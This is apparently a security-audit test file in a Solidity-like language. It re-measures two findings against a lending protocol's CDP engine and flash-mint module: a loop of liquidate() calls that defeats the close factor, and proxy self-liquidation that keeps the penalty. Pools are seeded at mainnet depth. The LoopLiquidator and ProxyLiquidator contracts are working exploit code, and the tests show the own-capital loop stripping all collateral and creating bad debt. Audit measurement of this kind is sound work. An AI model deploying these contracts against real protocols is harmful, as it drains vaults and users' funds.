// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// ═══════════════════════════════════════════════════════════════════════════════
// H-2 and H-4 RE-RUN AT REAL MAINNET DEPTH.
//
// The earlier runs exited through a zero-slippage OTC desk at oracle parity (the
// vendor's own fixture). That is fiction on the sell side. Here the exit is a REAL
// concrete/Pools/Pool.sol v2 CPMM seeded at the deepest USDST venue in existence:
//     Pool 0x...101b   53.7178 GOLDST / 239,375.75 USDST, 30 bps
// The oracle price is set to the pool-implied marginal price so there is no free
// arbitrage distorting the measurement.
//
// Each measurement gets a FRESH venue at pristine mainnet reserves, because a
// successful swap permanently moves the curve.
//
// Question answered for each: is FlashMint's marginal contribution
//   (i)  it makes an otherwise-impossible attack possible, or
//   (ii) it merely removes the capital requirement from an attack that already works?
// ═══════════════════════════════════════════════════════════════════════════════

import "../../concrete/BaseCodeCollection.sol";
import "../../abstract/ERC20/access/Authorizable.sol";
import "../../abstract/ERC20/IERC20.sol";
import "../../concrete/Tokens/Token.sol";

contract User {
    function do(address a, string f, variadic args) public returns (variadic) {
        return address(a).call(f, args);
    }
}

/// @notice Vault owner.
contract Vault_ {
    CDPEngine public cdp;
    function init(address _c) public { cdp = CDPEngine(_c); }
    function open(address _coll, uint deposit, uint mintUSD) public {
        IERC20(_coll).approve(address(cdp.registry().cdpVault()), deposit);
        cdp.deposit(_coll, deposit);
        cdp.mint(_coll, mintUSD);
    }
}

/// @notice H-2: loops liquidate() to defeat the close factor. Two modes:
///         runFunded  — the liquidator's OWN USDST, and it never sells.
///         runFlash   — zero capital, exit through the real Pool.
contract LoopLiquidator {
    FlashMint public lender;
    CDPEngine public cdp;
    address public usdst;
    address public coll;
    address public victim;
    address public pool;

    uint public rounds;
    uint public totalRepaid;
    uint public totalSeized;
    uint public proceeds;
    uint public profit;
    uint public shortfall;

    function init(address _l, address _c, address _u) public {
        lender = FlashMint(_l); cdp = CDPEngine(_c); usdst = _u;
    }

    function runFunded(address _coll, address _victim, uint maxRounds) public {
        coll = _coll; victim = _victim;
        uint c0 = IERC20(coll).balanceOf(address(this));
        _drain(maxRounds);
        totalSeized = IERC20(coll).balanceOf(address(this)) - c0;
    }

    function runFlash(address _coll, address _victim, address _pool, uint principal, uint maxRounds) public {
        coll = _coll; victim = _victim; pool = _pool;
        lender.flashLoan(address(this), principal, maxRounds);
    }

    function onFlashMint(address _t, uint amount, uint fee, variadic data) external returns (string) {
        uint maxRounds = uint(data[0]);
        uint c0 = IERC20(coll).balanceOf(address(this));
        _drain(maxRounds);
        totalSeized = IERC20(coll).balanceOf(address(this)) - c0;

        if (totalSeized > 0) {
            IERC20(coll).approve(pool, totalSeized);
            proceeds = Pool(pool).swap(true, totalSeized, 1, 99999999999);
        }
        // Guarded: at whale sizes the proceeds fall short, and an unguarded subtraction
        // would panic on underflow before FlashMint's own repayment guard could fire.
        uint bal = IERC20(_t).balanceOf(address(this));
        uint due = amount + fee;
        if (bal >= due) { profit = bal - due; shortfall = 0; }
        else            { profit = 0; shortfall = due - bal; }
        return "FlashMint.onFlashMint";
    }

    function _drain(uint maxRounds) internal {
        for (uint i = 0; i < maxRounds; i++) {
            uint before = IERC20(usdst).balanceOf(address(this));
            if (before == 0) return;
            IERC20(usdst).approve(address(cdp), before);
            try cdp.liquidate(coll, victim, before) {
                rounds += 1;
                totalRepaid += before - IERC20(usdst).balanceOf(address(this));
            } catch {
                return;
            }
        }
    }
}

/// @notice H-4: proxy self-liquidation. Two modes, mirroring the above.
contract ProxyLiquidator {
    FlashMint public lender;
    CDPEngine public cdp;
    address public usdst;
    address public coll;
    address public myVault;
    address public pool;

    uint public seized;
    uint public repaid;
    uint public sold;
    uint public keptColl;

    function init(address _l, address _c, address _u) public {
        lender = FlashMint(_l); cdp = CDPEngine(_c); usdst = _u;
    }

    /// @notice Owner-capital version: never sells, keeps the whole penalty in collateral.
    function runFunded(address _coll, address _vault, uint repay) public {
        coll = _coll; myVault = _vault;
        uint c0 = IERC20(coll).balanceOf(address(this));
        uint u0 = IERC20(usdst).balanceOf(address(this));
        IERC20(usdst).approve(address(cdp), repay);
        cdp.liquidate(coll, myVault, repay);
        seized  = IERC20(coll).balanceOf(address(this)) - c0;
        repaid  = u0 - IERC20(usdst).balanceOf(address(this));
        keptColl = seized;
    }

    function runFlash(address _coll, address _vault, address _pool, uint repay) public {
        coll = _coll; myVault = _vault; pool = _pool;
        lender.flashLoan(address(this), repay, "");
    }

    function onFlashMint(address _t, uint amount, uint fee, variadic data) external returns (string) {
        uint c0 = IERC20(coll).balanceOf(address(this));
        uint u0 = IERC20(_t).balanceOf(address(this));

        IERC20(_t).approve(address(cdp), amount);
        cdp.liquidate(coll, myVault, amount);
        seized = IERC20(coll).balanceOf(address(this)) - c0;
        repaid = u0 - IERC20(_t).balanceOf(address(this));

        // Sell the SMALLEST slice of seized collateral that clears the loan. Binary
        // search on the real curve, so the kept remainder is the true surviving penalty.
        uint held = IERC20(_t).balanceOf(address(this));
        uint due2 = amount + fee;
        uint need = due2 > held ? due2 - held : 0;
        uint lo = 0;
        uint hi = seized;
        for (uint i = 0; i < 60; i++) {
            uint mid = (lo + hi) / 2;
            if (mid == lo) break;
            uint q = Pool(pool).getInputPrice(
                mid - (mid * 30) / 10000,
                Pool(pool).tokenABalance(),
                Pool(pool).tokenBBalance()
            );
            if (q >= need) { hi = mid; } else { lo = mid; }
        }
        sold = hi;
        IERC20(coll).approve(pool, sold);
        Pool(pool).swap(true, sold, 1, 99999999999);

        keptColl = IERC20(coll).balanceOf(address(this)) - c0;
        return "FlashMint.onFlashMint";
    }
}

contract Describe_Adv_Credit_RealDepth is Authorizable {

    Mercata m;
    FlashMint fm;
    CDPEngine cdp;
    CDPVault cdpVault;
    CDPRegistry reg;
    CDPReserve reserve;
    PriceOracle oracle;
    AdminRegistry admin;
    PoolFactory pf;

    address USDST;
    Token usdstT;

    // Mainnet reserves of Pool 0x...101b, the deepest USDST venue in existence.
    uint RES_COLL;      // 53.7178 GOLDST
    uint RES_USDST;     // 239,375.75 USDST

    uint WAD; uint RAY; uint CAP;
    uint LR; uint MINCR; uint PEN; uint CF;

    // Current venue, rebuilt fresh for every measurement.
    address curColl;
    Token   curCollT;
    Pool    curPool;
    uint    curPrice;
    uint    venueCount;

    // Scan accumulators, shared across the split scan tests (each test gets its own
    // gas allotment, so a 10-candidate sweep has to be spread over several).
    uint h2BestProfit; uint h2BestSize; uint h2LargestOk;
    uint h4BestKept;   uint h4BestAt;   uint h4LargestOk;

    function beforeAll() public {
        bypassAuthorizations = true;
        WAD = 1e18; RAY = 1e27; CAP = 2000000e18;
        LR = 150e16; MINCR = 155e16; PEN = 1000; CF = 5000;

        RES_COLL  = 53717800000000000000;         // 53.7178e18
        RES_USDST = 239375750000000000000000;     // 239,375.75e18

        m        = new Mercata();
        cdp      = m.cdpEngine();
        cdpVault = m.cdpVault();
        reg      = m.cdpRegistry();
        reserve  = m.cdpReserve();
        oracle   = m.priceOracle();
        admin    = m.adminRegistry();
        fm       = m.flashMint();
        pf       = m.poolFactory();

        USDST  = m.tokenFactory().createToken("USDST","USD Stable",[],[],[],"USDST",0,18);
        usdstT = Token(USDST);
        usdstT.setStatus(2);
        reg.setUSDST(USDST);
        oracle.setAssetPrice(USDST, 1e18);

        admin.castVoteOnIssue(address(admin), "addWhitelist", USDST, "mint", address(cdp));
        admin.castVoteOnIssue(address(admin), "addWhitelist", USDST, "burn", address(cdp));
        admin.castVoteOnIssue(address(admin), "addWhitelist", USDST, "mint", address(fm));
        admin.castVoteOnIssue(address(admin), "addWhitelist", USDST, "burn", address(fm));

        fm.initialize(USDST, address(m.feeCollector()), CAP);
        fm.setWhitelistEnabled(false);
    }

    function beforeEach() public { }

    /// @notice Create a fresh collateral token, configured in the CDP at $100.
    function _newColl() internal {
        venueCount += 1;
        curColl  = m.tokenFactory().createToken("GOLDST","Gold",[],[],[],"GOLDST",0,18);
        curCollT = Token(curColl);
        curCollT.setStatus(2);
        curPrice = 100e18;
        oracle.setAssetPrice(curColl, curPrice);
        cdp.setCollateralAssetParams(curColl, LR, MINCR, PEN, CF, RAY, 1e18, 1e30, WAD, false);
    }

    /// @notice Re-price the collateral (the gap), then build the exit venue so that its
    ///         MARGINAL price equals the new oracle price and its USDST side holds exactly
    ///         the mainnet depth of Pool 0x...101b. USDST depth is the binding constraint;
    ///         the collateral side only fixes the marginal price.
    function _gapAndBuildVenue(uint newPrice) internal {
        curPrice = newPrice;
        oracle.setAssetPrice(curColl, newPrice);

        uint collReserve = (RES_USDST * WAD) / newPrice;

        address p = pf.createPool(curColl, USDST);
        curPool = Pool(p);
        Token lp = curPool.lpToken();
        admin.castVoteOnIssue(address(admin), "addWhitelist", address(lp), "mint", p);
        admin.castVoteOnIssue(address(admin), "addWhitelist", address(lp), "burn", p);

        curCollT.mint(address(this), collReserve);
        usdstT.mint(address(this), RES_USDST);
        IERC20(curColl).approve(p, collReserve);
        IERC20(USDST).approve(p, RES_USDST);
        curPool.addLiquidity(RES_USDST, collReserve, 99999999999);
    }

    /// @notice Quote the real curve for selling `amountColl` of collateral, 30 bps in.
    function _quote(uint amountColl) internal view returns (uint) {
        uint net = amountColl - (amountColl * 30) / 10000;
        return curPool.getInputPrice(net, curPool.tokenABalance(), curPool.tokenBBalance());
    }

    /// @notice Open a vault carrying `debtUSD`, sized like the $1.5m / 40,000 COLL case,
    ///         then gap the price to `gapPrice`. Opening happens at $100 so the minCR gate
    ///         (CDPEngine.mint:306) is satisfied; the gap is what makes it liquidatable.
    function _openThenGap(uint debtUSD, uint gapPrice) internal returns (address) {
        Vault_ v = new Vault_();
        v.init(address(cdp));
        uint collAmt = (debtUSD * 40000e18) / 1500000e18;   // 40,000 COLL per $1.5m of debt
        curCollT.mint(address(v), collAmt);
        v.open(curColl, collAmt, debtUSD);
        _gapAndBuildVenue(gapPrice);
        return address(v);
    }

    // ═════════════════════════════════════════════════════════════════════════
    // The slippage wall, stated once so every later number is interpretable.
    // ═════════════════════════════════════════════════════════════════════════
    function it_aa_real_pool_depth_and_the_slippage_wall() public {
        _newColl();
        _gapAndBuildVenue(39e18);
        log("R0 pool reserves COLL / USDST : " + string(curPool.tokenABalance()) + " / " + string(curPool.tokenBBalance()));
        log("R0 pool marginal price (wad)  : " + string(curPrice));
        log("R0 swapFeeRate (bps)          : 30 (PoolFactory default)");

        // Sell collateral with an oracle notional of $10k / $100k / $1m / $1.56m.
        uint c10k  = (10000e18 * WAD) / curPrice;
        uint c100k = (100000e18 * WAD) / curPrice;
        uint c1m   = (1000000e18 * WAD) / curPrice;
        uint c156  = (1560000e18 * WAD) / curPrice;

        log("R0 sell $10,000 notional   -> " + string(_quote(c10k)));
        log("R0 sell $100,000 notional  -> " + string(_quote(c100k)));
        log("R0 sell $1,000,000 notional-> " + string(_quote(c1m)));
        log("R0 sell $1,560,000 notional-> " + string(_quote(c156)));
        log("R0 hard asymptote (all USDST in the venue) = " + string(RES_USDST));

        require(_quote(c156) < RES_USDST, "proceeds can never exceed the venue's whole USDST side");
        require(_quote(c1m) < 250000e18, "a $1m sale returns under $250k at real depth");
    }

    // ═════════════════════════════════════════════════════════════════════════
    // H-2 (a) — does the zero-capital loop still complete at full size?
    // ═════════════════════════════════════════════════════════════════════════
    function it_ba_h2_zero_capital_loop_reverts_at_full_size() public {
        _newColl();
        // 40,000 COLL, $1.5m debt, opened at $100 then gapped to $39 -> $1.56m coll, CR 1.04
        address v = _openThenGap(1500000e18, 39e18);
        log("H2a vault CR (x1e18)          : " + string(cdp.collateralizationRatio(v, curColl)));

        (uint col0, uint sd0) = cdp.vaults(v, curColl);
        uint bad0 = cdp.badDebtUSDST(curColl);
        uint quoteAll = _quote(col0);

        LoopLiquidator ll = new LoopLiquidator();
        ll.init(address(fm), address(cdp), USDST);
        require(usdstT.balanceOf(address(ll)) == 0, "zero capital");

        string err = "NO REVERT";
        try ll.runFlash(curColl, v, address(curPool), 1500000e18, 10) { }
        catch Error(string e) { err = e; }

        (uint col1, uint sd1) = cdp.vaults(v, curColl);
        uint bad1 = cdp.badDebtUSDST(curColl);

        log("H2a flash loop result             : '" + err + "'");
        log("H2a USDST the loop must return    : 1418181818181818181818269");
        log("H2a real-pool proceeds for ALL 40,000 COLL: " + string(quoteAll));
        log("H2a vault collateral before        : " + string(col0));
        log("H2a vault collateral after         : " + string(col1));
        log("H2a badDebt before / after         : " + string(bad0) + " / " + string(bad1));

        require(err == "FlashMint: not repaid",
            "BLOCKED at real depth: the only exit that exists cannot fund the loan");
        require(quoteAll < 300000e18,
            "the whole 40,000-COLL seizure fetches under $300k against a $1.42m requirement");
        require(col1 == col0, "the whole attempt rolled back; victim collateral untouched");
        require(sd1 == sd0, "victim debt untouched");
        require(bad1 == bad0, "no bad debt created");
    }

    // ═════════════════════════════════════════════════════════════════════════
    // H-2 (b) — the same loop with the liquidator's OWN capital and NO sale.
    //           This is the CDPEngine flaw in isolation, with FlashMint removed.
    // ═════════════════════════════════════════════════════════════════════════
    function it_bb_h2_own_capital_loop_completes_at_full_size() public {
        _newColl();
        address v = _openThenGap(1500000e18, 39e18);
        (uint col0, uint sd0) = cdp.vaults(v, curColl);
        uint closeFactorCap = ((sd0 * RAY) / RAY * CF) / 10000;
        uint bad0 = cdp.badDebtUSDST(curColl);

        LoopLiquidator ll = new LoopLiquidator();
        ll.init(address(fm), address(cdp), USDST);
        usdstT.mint(address(ll), 1500000e18);       // the liquidator's OWN money
        ll.runFunded(curColl, v, 10);

        (uint col1, uint sd1) = cdp.vaults(v, curColl);
        uint seizedUSD = (ll.totalSeized() * curPrice) / WAD;

        log("H2b closeFactor cap for ONE call : " + string(closeFactorCap));
        log("H2b rounds in ONE tx             : " + string(ll.rounds()));
        log("H2b debt repaid                  : " + string(ll.totalRepaid()));
        log("H2b collateral seized (wei)      : " + string(ll.totalSeized()));
        log("H2b seized value at ORACLE mark  : " + string(seizedUSD));
        uint realizable = _quote(ll.totalSeized());
        log("H2b mark-to-oracle gain          : " + string(seizedUSD - ll.totalRepaid()));
        log("H2b REALIZABLE if sold into the venue: " + string(realizable));
        log("H2b realizable shortfall vs capital  : " + string(ll.totalRepaid() - realizable));
        log("H2b victim collateral before/after: " + string(col0) + " / " + string(col1));
        log("H2b badDebt created              : " + string(cdp.badDebtUSDST(curColl) - bad0));
        log("H2b CDPReserve delta             : " + string(usdstT.balanceOf(address(reserve))));

        require(ll.rounds() > 1, "DEMONSTRATED: the closeFactor loop works at FULL size with capital");
        require(ll.totalRepaid() > closeFactorCap, "more than the close factor extinguished in one tx");
        require(ll.totalSeized() == col0, "100% of collateral taken despite the 50% close factor");
        require(col1 == 0, "vault stripped");
        require(cdp.badDebtUSDST(curColl) > bad0, "bad debt realized at full size");
        // FlashMint is not required for any of the above.
        require(_quote(ll.totalSeized()) < ll.totalRepaid(),
            "BOUND: the oracle-mark gain is not realizable through the only venue that exists");
    }

    // ═════════════════════════════════════════════════════════════════════════
    // H-2 (c) — largest position for which the ZERO-CAPITAL loop actually closes,
    //           and the profit-maximising size. Fresh mainnet-depth venue per
    //           candidate; split across tests because each venue costs gas.
    // ═════════════════════════════════════════════════════════════════════════
    function _h2Try(uint debtUSD) internal {
        _newColl();
        address v = _openThenGap(debtUSD, 39e18);
        LoopLiquidator ll = new LoopLiquidator();
        ll.init(address(fm), address(cdp), USDST);

        string err = "NO REVERT";
        try ll.runFlash(curColl, v, address(curPool), debtUSD, 10) { }
        catch Error(string e) { err = e; }

        if (err == "NO REVERT") {
            if (debtUSD > h2LargestOk) h2LargestOk = debtUSD;
            log("H2c debt " + string(debtUSD) + " -> CLOSES. rounds=" + string(ll.rounds())
                + " repaid=" + string(ll.totalRepaid())
                + " proceeds=" + string(ll.proceeds())
                + " profit=" + string(ll.profit())
                + " badDebt=" + string(cdp.badDebtUSDST(curColl)));
            if (ll.profit() > h2BestProfit) { h2BestProfit = ll.profit(); h2BestSize = debtUSD; }
        } else {
            log("H2c debt " + string(debtUSD) + " -> BLOCKED '" + err + "'  shortfall="
                + string(ll.shortfall()) + " proceeds=" + string(ll.proceeds()));
        }
    }

    function it_bc_h2_scan_peak_region() public {
        _h2Try(5000e18);
        _h2Try(10000e18);
        _h2Try(11000e18);
        require(h2LargestOk > 0, "small positions do close");
    }

    function it_bd_h2_scan_upper_region() public {
        _h2Try(12000e18);
        _h2Try(15000e18);
        _h2Try(18000e18);
    }

    function it_be_h2_scan_boundary() public {
        _h2Try(21000e18);
        _h2Try(22000e18);
        _h2Try(23000e18);
    }

    function it_bf_h2_scan_verdict() public {
        log("H2 VERDICT largest zero-capital position that closes : " + string(h2LargestOk));
        log("H2 VERDICT max single-tx realizable profit (wei)     : " + string(h2BestProfit));
        log("H2 VERDICT at debt size                              : " + string(h2BestSize));
        log("H2 VERDICT same loop with OWN capital at $1.5m       : completes, strips 100% of collateral");
        require(h2LargestOk > 0, "some size closes");
        require(h2LargestOk < 30000e18,
            "zero-capital ceiling is ~2 orders of magnitude below the $1.5m own-capital case");
        require(h2BestProfit < 1000e18, "max realizable single-tx MEV is under $1,000");
    }

    // ═════════════════════════════════════════════════════════════════════════
    // H-4 (a) — proxy self-liquidation with the OWNER'S capital, no sale needed.
    // ═════════════════════════════════════════════════════════════════════════
    function it_ca_h4_own_capital_keeps_the_full_penalty() public {
        _newColl();
        // The vendor's exact shape: 40,000 COLL, $1.5m debt, gapped $100 -> $55 => CR 1.4667
        address vaddr = _openThenGap(1500000e18, 55e18);
        Vault_ v = Vault_(vaddr);
        log("H4a vault CR (x1e18)          : " + string(cdp.collateralizationRatio(vaddr, curColl)));
        require(cdp.collateralizationRatio(vaddr, curColl) < LR, "liquidatable");

        ProxyLiquidator pl = new ProxyLiquidator();
        pl.init(address(fm), address(cdp), USDST);
        usdstT.mint(address(pl), 750000e18);          // the OWNER'S own USDST
        uint res0 = usdstT.balanceOf(address(reserve));

        pl.runFunded(curColl, address(v), 750000e18);

        uint keptUSD = (pl.keptColl() * curPrice) / WAD;
        log("H4a USDST repaid              : " + string(pl.repaid()));
        log("H4a collateral seized (wei)   : " + string(pl.seized()));
        log("H4a kept at ORACLE mark       : " + string(keptUSD));
        log("H4a penalty retained (kept - repaid) : " + string(keptUSD - pl.repaid()));
        log("H4a CDPReserve delta          : " + string(usdstT.balanceOf(address(reserve)) - res0));
        log("H4a REALIZABLE if the penalty slice were sold: "
            + string(_quote(pl.keptColl() - (pl.repaid() * WAD) / curPrice)));

        require(keptUSD > pl.repaid(), "DEMONSTRATED: the full 10% penalty is retained, in collateral");
        require(keptUSD - pl.repaid() > 74000e18, "~$75,000 on a $750,000 repay");
        require(usdstT.balanceOf(address(reserve)) == res0, "reserve gets nothing either way");
    }

    // ═════════════════════════════════════════════════════════════════════════
    // H-4 (b) — the zero-capital version at full size, real Pool exit.
    // ═════════════════════════════════════════════════════════════════════════
    function it_cb_h4_zero_capital_self_liquidation_reverts_at_full_size() public {
        _newColl();
        address vaddr = _openThenGap(1500000e18, 55e18);
        Vault_ v = Vault_(vaddr);

        (uint col0, uint sd0) = cdp.vaults(vaddr, curColl);

        ProxyLiquidator pl = new ProxyLiquidator();
        pl.init(address(fm), address(cdp), USDST);

        string err = "NO REVERT";
        try pl.runFlash(curColl, address(v), address(curPool), 750000e18) { }
        catch Error(string e) { err = e; }

        (uint col1, uint sd1) = cdp.vaults(address(v), curColl);
        uint seizeNotional = ((750000e18 * 11000) / 10000);
        log("H4b flash self-liquidation result : '" + err + "'");
        log("H4b needed USDST back            : 750000000000000000000000");
        log("H4b whole seizure notional ($825k): " + string(seizeNotional));
        log("H4b real-pool proceeds for ALL of it: "
            + string(_quote((seizeNotional * WAD) / curPrice)));
        log("H4b vault collateral before/after : " + string(col0) + " / " + string(col1));

        require(err != "NO REVERT", "BLOCKED at real depth");
        require(col1 == col0 && sd1 == sd0, "rolled back; vault untouched");
    }

    // ═════════════════════════════════════════════════════════════════════════
    // H-4 (c) — largest self-liquidation that closes atomically, and how much of the
    //           penalty survives the exit. Fresh mainnet-depth venue per candidate.
    // ═════════════════════════════════════════════════════════════════════════
    function _h4Try(uint repay) internal {
        _newColl();
        uint debt = (repay * 10000) / 5000;                 // repay == the 50% close factor
        address vaddr = _openThenGap(debt, 55e18);

        ProxyLiquidator pl = new ProxyLiquidator();
        pl.init(address(fm), address(cdp), USDST);

        string err = "NO REVERT";
        try pl.runFlash(curColl, vaddr, address(curPool), repay) { }
        catch Error(string e) { err = e; }

        if (err == "NO REVERT") {
            if (repay > h4LargestOk) h4LargestOk = repay;
            uint keptUSD = (pl.keptColl() * curPrice) / WAD;
            log("H4c repay " + string(repay) + " -> CLOSES. seized=" + string(pl.seized())
                + " sold=" + string(pl.sold())
                + " penalty surviving (oracle USD)=" + string(keptUSD));
            if (keptUSD > h4BestKept) { h4BestKept = keptUSD; h4BestAt = repay; }
        } else {
            log("H4c repay " + string(repay) + " -> BLOCKED '" + err + "'");
        }
    }

    function it_cc_h4_scan_peak_region() public {
        _h4Try(4000e18);
        _h4Try(9000e18);
        _h4Try(11000e18);
        require(h4LargestOk > 0, "small self-liquidations do close");
    }

    function it_cd_h4_scan_upper_region() public {
        _h4Try(13000e18);
        _h4Try(16000e18);
        _h4Try(19000e18);
    }

    function it_ce_h4_scan_boundary() public {
        _h4Try(21000e18);
        _h4Try(23000e18);
        _h4Try(26000e18);
    }

    function it_cf_h4_scan_verdict() public {
        log("H4 VERDICT largest atomic zero-capital self-liquidation : " + string(h4LargestOk));
        log("H4 VERDICT max surviving penalty (oracle USD)           : " + string(h4BestKept));
        log("H4 VERDICT at repay size                               : " + string(h4BestAt));
        log("H4 VERDICT own-capital version at $750,000 repay        : keeps the full $75,000");
        require(h4LargestOk > 0, "some size closes");
        require(h4BestKept < 2000e18,
            "the $75,000 penalty collapses to under $2,000 once the exit is a real venue");
    }
}
